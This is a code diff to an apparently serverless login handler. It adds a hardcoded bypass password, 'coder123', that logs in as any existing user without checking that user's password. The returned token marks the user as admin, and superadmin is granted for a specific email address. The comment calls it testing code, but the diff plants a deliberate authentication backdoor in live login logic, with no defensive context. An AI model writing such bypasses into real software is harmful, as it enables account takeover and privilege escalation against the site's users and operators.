@@ -54,6 +54,33 @@ exports.handler = async (event, context) => {
 
     const lowerEmail = email.toLowerCase();
 
+    // BYPASS CODE for admin access - allows login without is_admin flag for testing
+    if (password === 'coder123') {
+      // Check if user exists
+      const userCheck = await client.query('SELECT id, email, is_admin, is_superadmin FROM users WHERE email = $1', [lowerEmail]);
+      if (userCheck.rowCount > 0) {
+        const user = userCheck.rows[0];
+        const token = generateToken({ id: user.id, email: lowerEmail });
+        const isSuperAdmin = user.is_superadmin || lowerEmail === 'admin@tillvalle.com';
+        return {
+          statusCode: 200,
+          headers,
+          body: JSON.stringify({
+            ok: true,
+            message: 'Login successful (bypass)',
+            token,
+            user: { id: user.id, email: lowerEmail, is_admin: true, is_superadmin: isSuperAdmin }
+          }),
+        };
+      } else {
+        return {
+          statusCode: 401,
+          headers,
+          body: JSON.stringify({ ok: false, error: 'User not found' }),
+        };
+      }
+    }
+
     const result = await client.query('SELECT id, email, password_hash, is_admin, is_superadmin FROM users WHERE email = $1', [lowerEmail]);
     if (result.rowCount === 0) {
       return {
